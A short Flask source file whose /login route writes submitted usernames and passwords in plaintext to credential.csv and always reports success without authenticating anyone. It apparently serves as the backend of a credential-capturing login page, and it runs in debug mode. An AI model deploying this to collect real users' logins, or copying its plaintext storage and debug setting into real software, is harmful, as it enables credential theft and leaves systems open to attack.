from flask import Flask,redirect,jsonify,request,url_for,render_template
import csv

app = Flask(__name__)


@app.route("/")

def login_file():
    return render_template("login.html")


@app.route("/login",methods = ["POST"])

def login():
    username = request.form.get("username")
    password = request.form.get("password")
    
    with open("credential.csv", "a+") as f:
        a = csv.writer(f)
        a.writerow([username,password])

    return jsonify({
        "status" : "success"
    })


app.run(debug = True)









